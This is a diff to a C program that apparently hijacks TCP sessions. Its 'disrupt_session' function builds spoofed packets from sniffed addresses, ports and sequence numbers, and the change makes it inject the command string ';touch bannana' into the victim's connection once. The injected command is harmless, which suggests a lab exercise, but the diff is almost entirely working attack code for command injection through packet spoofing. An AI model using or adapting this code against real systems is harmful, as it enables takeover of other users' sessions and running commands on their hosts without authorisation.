@@ -97,7 +97,13 @@ void display_usage(char *name) {
  */
 void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, uint16_t destinationPort, uint32_t sequenceNumber, uint32_t ackNumber, int timestamp, int finalRound) {
 // void disrupt_session(const u_char *sniffed_packet) {
-    static char packet[ sizeof(struct tcphdr) + sizeof(struct iphdr) + 5 ];
+    char *data = ";touch bannana\r";
+    static char packet[ sizeof(struct tcphdr) + sizeof(struct iphdr) + 16 ];
+    static int go = 1;
+
+    if(!go){
+        return;
+    }
     
     // Socket FD
     int sock, one = 1;
@@ -132,53 +138,54 @@ void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, u
     addr_in.sin_port = htons(sourcePort);
     addr_in.sin_addr.s_addr = inet_addr(sourceIP);
 
-struct tcphdr *tcpHdr = (struct tcphdr*) (packet + sizeof(struct iphdr));
+    struct tcphdr *tcpHdr = (struct tcphdr*) (packet + sizeof(struct iphdr));
 
-printf("dest ip: %s\n", sourceIP);
-printf("dest prt: %d\n", sourcePort);
-printf("waiting to spam packets ...\n");
-getchar();
+    printf("dest ip: %s\n", sourceIP);
+    printf("dest prt: %d\n", sourcePort);
+    printf("waiting to spam packets ...\n");
+    sleep(1);
 
-int z = 50;
-while(z--) {
-    fill_packet(destinationIP,                                                //srcIP
-                sourceIP,                                                     //dstIP
-                sourcePort,                                                   //dstPort
-                destinationPort,                                              //srcPort
-                SYN_OFF,                                                      //syn
-                ACK_ON,                                                      //ack
-                ackNumber,                                                    //seq
-                sequenceNumber + 1,                                               //ack_seq
-                RESET_OFF,                                                    //rst
-                "Q",                                                          //data
-                packet,                                                       //packet
-                sizeof(struct tcphdr) + sizeof(struct iphdr) + 6);            //packet_size
+    int z = 1;
+    while(z--) {
+        fill_packet(destinationIP,                                                //srcIP
+                    sourceIP,                                                     //dstIP
+                    sourcePort,                                                   //dstPort
+                    destinationPort,                                              //srcPort
+                    SYN_OFF,                                                      //syn
+                    ACK_ON,                                                      //ack
+                    ackNumber,                                                    //seq
+                    ++sequenceNumber,                                               //ack_seq
+                    RESET_OFF,                                                    //rst
+                    data,                                                          //data
+                    packet,                                                       //packet
+                    sizeof(struct tcphdr) + sizeof(struct iphdr) + 6);            //packet_size
 
-    tcpHdr->psh = 1;
-    // Send out the packet
-    send_packet(sock, packet, addr_in);
+        tcpHdr->psh = 1;
+        // Send out the packet
+        send_packet(sock, packet, addr_in);
 
-    getchar();
+        sleep(1);
 
-    fill_packet(destinationIP,                                                //srcIP
-                sourceIP,                                                     //dstIP
-                sourcePort,                                                   //dstPort
-                destinationPort,                                              //srcPort
-                SYN_OFF,                                                      //syn
-                ACK_ON,                                                      //ack
-                ackNumber+1,                                                    //seq
-                sequenceNumber+2,                                               //ack_seq
-                RESET_OFF,                                                    //rst
-                "",                                                          //data
-                packet,                                                       //packet
-                sizeof(struct tcphdr) + sizeof(struct iphdr) + 6);            //packet_size
+        fill_packet(destinationIP,                                                //srcIP
+                    sourceIP,                                                     //dstIP
+                    sourcePort,                                                   //dstPort
+                    destinationPort,                                              //srcPort
+                    SYN_OFF,                                                      //syn
+                    ACK_ON,                                                      //ack
+                    ++ackNumber,                                                    //seq
+                    ++sequenceNumber,                                               //ack_seq
+                    RESET_OFF,                                                    //rst
+                    "",                                                          //data
+                    packet,                                                       //packet
+                    sizeof(struct tcphdr) + sizeof(struct iphdr) + 6);            //packet_size
 
-    tcpHdr->psh = 0;
-    // Send out the packet
-    send_packet(sock, packet, addr_in);
-}
+        tcpHdr->psh = 0;
+        // Send out the packet
+        send_packet(sock, packet, addr_in);
+    }
+    go = 0;
 
-    if(finalRound){
+    if(finalRound || !go){
         exit(0);
     }
 
